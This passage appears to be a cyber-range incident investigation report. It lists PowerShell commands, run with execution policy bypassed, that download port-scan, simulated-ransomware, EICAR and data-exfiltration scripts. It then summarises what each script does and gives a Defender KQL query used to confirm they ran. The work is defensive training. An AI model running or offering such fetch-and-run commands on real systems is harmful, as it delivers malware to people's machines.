**PowerShell Commands Executed:**
1. `powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1 -OutFile C:\programdata\portscan.ps1`
2. `powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1`
3. `powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/eicar.ps1 -OutFile C:\programdata\eicar.ps1`
4. `powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1 -OutFile C:\programdata\exfiltratedata.ps1`

**Script Analysis:**

1. **portscan.ps1**
   - Scans a specified range of IP addresses for open ports from a list of common ports and logs the results.

2. **pwncrypt.ps1**
   - Encrypts files in a selected user's desktop folder, simulating ransomware activity, and creates a ransom note with decryption instructions.

3. **eicar.ps1**
   - Creates an EICAR test file, a standard for testing antivirus solutions, and logs the process.

4. **exfiltratedata.ps1**
   - Generates fake employee data, compresses it into a ZIP file, and uploads it to an Azure Blob Storage container, simulating data exfiltration.

#### User Interaction

The affected user was contacted to inquire about their activities at the time the logs were generated. They reported attempting to install a free piece of software, after which a black screen appeared briefly, followed by no further action.

#### Investigation Findings

Using Defender for Endpoint, it was confirmed that the downloaded scripts were executed. The following query was used to verify this:

```kusto
let TargetDevice = "cddar-test";
let ScriptNames = dynamic(["eicar.ps1", "exfiltratedata.ps1", "portscan.ps1", "pwncrypt.ps1"]);
DeviceProcessEvents
| where DeviceName == TargetDevice
| where FileName == "powershell.exe"
| where ProcessCommandLine contains "-File" and ProcessCommandLine has_any (ScriptNames)
| order by TimeGenerated
| project TimeGenerated, AccountName, DeviceName, FileName, ProcessCommandLine
| summarize Count = count() by AccountName, DeviceName, FileName, ProcessCommandLine
```
